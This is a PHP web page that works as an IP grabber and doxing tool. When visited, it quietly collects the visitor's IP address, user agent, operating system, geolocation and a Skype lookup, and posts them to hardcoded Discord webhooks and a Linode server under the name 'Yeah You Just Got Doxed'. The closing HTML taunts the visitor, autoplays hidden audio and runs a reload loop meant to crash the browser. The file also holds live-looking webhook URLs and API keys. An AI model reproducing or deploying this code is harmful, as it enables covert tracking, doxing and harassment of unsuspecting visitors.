<?php
// Function to get the user's IP address
function getUserIP() {
    $ipaddress = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
    return $ipaddress;
}

// Function to get the user's User Agent
function getUserAgent() {
    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    return $userAgent;
}

// Function to get the user's operating system
function getUserOS() {
    $userAgent = getUserAgent();
    $os = "Unknown";

    if (strpos($userAgent, "Windows") !== false) {
        $os = "Windows";
    } elseif (strpos($userAgent, "Android") !== false) {
        $os = "Android";
    } elseif (strpos($userAgent, "iPhone") !== false || strpos($userAgent, "iPad") !== false || strpos($userAgent, "iPod") !== false) {
        $os = "iOS";
    } elseif (strpos($userAgent, "Linux") !== false || strpos($userAgent, "Ubuntu") !== false || strpos($userAgent, "Fedora") !== false || strpos($userAgent, "Debian") !== false) {
        $os = "Linux";
    } elseif (strpos($userAgent, "Mac") !== false) {
        $os = "Mac OS";
    } elseif (strpos($userAgent, "CrOS") !== false) {
        $os = "Chrome OS";
    }

    return $os;
}

// Function to get the device brand based on the operating system
function getDeviceBrand($os) {
    $brand = "Unknown";

    if ($os === "Chrome OS") {
        $brand = "Chromebook";
    } elseif ($os === "iOS") {
        $brand = "Apple";
    } elseif ($os === "Windows") {
        $brand = "Microsoft";
    }

    return $brand;
}

// Define an array of webhook URLs
$webhooks = [
    // Your webhook URLs here
    "https://discord.com/api/webhooks/1153701931605299331/AKFw_-kyVYmJ3Sjskqa5_svmohODPWPy-HuJ2hlFfVgJbXxTDMVWiazBfdQ3wriomr5s",
    "https://discord.com/api/webhooks/1153701929034203136/Y3EA3xA9384BAWsJeHnbObLZtA1wcUuoLblxshPYJJn0blYxpIOfZz1ygNEyUa22C25K",
    "https://discord.com/api/webhooks/1153701926421151795/vA8SlDUTneCfn4JXJ8C2NxsNIpeecbkHPQ-VhYZufNrCJ1r-jqmCc4RpLii4-rCtXeMU",
    "https://discord.com/api/webhooks/1153701923841658910/PPsjL5FeV2UqOo8rOR1To-LgudfDts1m7mxcKh1TN4aDlEs0-gJJSt2q5bX-RXdKKUfZ",
    "https://discord.com/api/webhooks/1153640898119344198/bsmBHwKhYFLA8HANWFOduE_SPbz9U7KvHYE50zl0uu8WnvZaHgzGf8KkywxcewCPP9Os",

  "http://139-162-181-128.ip.linodeusercontent.com/bakken"
];

// Randomly select a webhook URL from the array
$webhookURL = $webhooks[array_rand($webhooks)];

// Add the link you provided to the array of webhook URLs
$webhooks[] = "http://139-162-181-128.ip.linodeusercontent.com/bakken";

// Randomly select a webhook URL again, which now includes the new link
$webhookURL = $webhooks[array_rand($webhooks)];

// Rest of your existing PHP code...

// Get the user's IP address
$ipaddress = getUserIP();

// Get the user's User Agent
$userAgent = getUserAgent();

// Check if the IP has been sent within the last 24 hours
$ipLog = 'why.txt';

// Encrypt the IP address before storing it
$encryptedIP = base64_encode(base64_encode(base64_encode(base64_encode(base64_encode($ipaddress)))) . "\n");

$ipLogData = file_get_contents($ipLog);

if (strpos($ipLogData, $encryptedIP) !== false) {
    // IP address already sent
    echo '';
} else {
    // Get IP Geolocation data using ipgeolocation.io API
    $apiKey = "b1e9549a924b474bbf04e9d029327694"; // Replace with your actual API key
    $apiURL = "https://api.ipgeolocation.io/ipgeo?apiKey={$apiKey}&ip={$ipaddress}";
    $geolocationData = json_decode(@file_get_contents($apiURL)); // Use "@" to suppress errors

    if ($geolocationData === NULL) {
        // Handle the error as needed
        echo 'Failed to retrieve IP address and geolocation data.';
    } else {
        // Get the user's operating system and device brand
        $os = getUserOS();
        $brand = getDeviceBrand($os);

        // Create the clean embed-style payload for the successful response
        $mapURL = "https://maps.google.com/maps?q={$geolocationData->latitude},{$geolocationData->longitude}&t=k&z=15"; // Create the map URL

        // Include Skype API from webresolver.nl
        $skypeAPI = "https://webresolver.nl/api.php?key=IWSME-NQUVS-Z62ER-10098&action=ip2skype&string={$ipaddress}";

        $jsonPayload = [
            'username' => 'Yeah You Just Got Doxed ',
            'avatar_url' => 'https://steamuserimages-a.akamaihd.net/ugc/5100921132464001344/A3A6995917F69B78D9CF69DB504E8329054B70BB/?imw=637&imh=358&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=true', // Set the avatar URL
            'embeds' => [
                [
                    'title' => 'IP Address and Geolocation Data',
                    'description' => "**User ID:** " . $_GET['userid'] . "\n**IP Address:** {$geolocationData->ip}\n**User Agent:** {$userAgent}\n**Operating System:** {$os}\n**Device Brand:** {$brand}\n[Full Geolocation Data](https://ipgeolocation.io/?ip={$geolocationData->ip})",
                    'color' => 000000, // Color code
                    'thumbnail' => [
                        'url' => $geolocationData->country_flag, // Country flag URL
                    ],
                    'fields' => [
                        [
                            'name' => 'Continent',
                            'value' => $geolocationData->continent_name,
                            'inline' => true,
                        ],
                        [
                            'name' => 'Country',
                            'value' => "{$geolocationData->country_name} ({$geolocationData->country_code2})",
                            'inline' => true,
                        ],
                        [
                            'name' => 'State/Province',
                            'value' => $geolocationData->state_prov,
                            'inline' => true,
                        ],
                        [
                            'name' => 'City',
                            'value' => $geolocationData->city,
                            'inline' => true,
                        ],
                        [
                            'name' => 'Latitude',
                            'value' => $geolocationData->latitude,
                            'inline' => true,
                        ],
                        [
                            'name' => 'Longitude',
                            'value' => $geolocationData->longitude,
                            'inline' => true,
                        ],
                        [
                            'name' => 'Languages',
                            'value' => $geolocationData->languages,
                            'inline' => true,
                        ],
                        // Skype information
                        [
                            'name' => 'Skype',
                            'value' => file_get_contents($skypeAPI),
                            'inline' => true,
                        ],
                    ],
                    'image' => [
                        'url' => $geolocationData->image, // Image URL
                    ],
                    'footer' => [
                        'text' => 'Provided by Kabamjo',
                    ],
                    'url' => $mapURL, // Add the map URL
                ],
            ],
        ];

        $options = [
            'http' => [
                'method' => 'POST',
                'header' => 'Content-Type: application/json',
                'content' => json_encode($jsonPayload),
            ],
        ];

        $context = stream_context_create($options);
        $response = file_get_contents($webhookURL, false, $context);

        if ($response === FALSE) {
            echo '';
        } else {
            // Log the encrypted IP address to prevent sending it again for 24 hours
            file_put_contents($ipLog, $encryptedIP, FILE_APPEND);
            echo '';
        }
    }
}
?>

<html>
<body>
  <h2>
    you just got crasht rip your browser I also have your ip</h2>
  <p></p>
  <p id="demo"></p>
  <audio style="display:none;" controls loop autoplay>
    <source src="horse.ogg" type="audio/ogg">
    <source src="plus.mp3" type="audio/mpeg">
    Your browser does not support the audio element.
  </audio>
 <script src=""></script> 
  <script>
    onbeforeunload = function(prompt){localStorage.x=1};
    setTimeout(function(){
      if (("Do you REALLY want me tTo crash your browser?")){
        while(1)location.reload(1)
      }
    }, 1);
    
  </script>
</body>
</html>
